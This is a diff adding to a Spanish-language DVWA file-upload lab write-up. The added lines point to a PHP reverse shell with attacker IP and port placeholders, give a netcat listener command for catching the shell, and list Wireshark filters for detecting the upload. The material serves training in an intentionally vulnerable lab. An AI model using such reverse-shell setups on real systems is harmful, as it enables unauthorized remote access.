@@ -170,3 +170,25 @@ Content-Type: image/jpeg
 ![](capturas/file-upload-lab-dvwa-level-medium-2.png)
 ![](capturas/file-upload-lab-dvwa-level-medium-3.png)
 
+
+### Una shell para probar:
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+Parámetros que hay que cambiar:
+```
+$ip = 'ipAtacante';  // CHANGE THIS
+$port = puertoEscucha;       // CHANGE THIS
+```
+Para tomar la shel reversa:
+```
+nc -lnvp puertoEscucha
+```
+
+
+### Escuchando con Wireshark un ataque File Upload Vulnerabilities
+Filtros Wireshark:
+http.request.method == "POST"
+http.content_type contains "image/jpeg"
+![](capturas/file-upload-lab-dvwa-level-medium-4.png)
+![](capturas/file-upload-lab-dvwa-level-medium-5.png)
+![](capturas/file-upload-lab-dvwa-level-medium-6.png)
+![](capturas/file-upload-lab-dvwa-level-medium-7.png)
